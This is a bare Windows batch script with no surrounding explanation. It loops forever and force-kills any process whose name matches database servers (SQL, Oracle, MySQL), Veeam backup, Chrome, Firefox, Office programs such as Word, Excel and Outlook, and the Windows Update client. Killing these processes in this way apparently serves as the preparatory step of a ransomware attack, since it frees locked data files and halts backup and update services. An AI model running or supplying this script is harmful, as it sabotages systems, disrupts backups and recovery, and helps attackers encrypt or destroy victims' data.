:start
ping 127.0.0.1 -n 2 >nul & taskkill /f /im sql* & taskkill /f /im oracle* & taskkill /f /im mysq* & taskkill /f /im chrome* & taskkill /f /im veeam* & taskkill /f /im firefox* & taskkill /f /im excel* & taskkill /f /im msaccess* & taskkill /f /im onenote* & taskkill /f /im outlook* & taskkill /f /im powerpnt* & taskkill /f /im winword* & taskkill /f /im wuauclt* 
goto start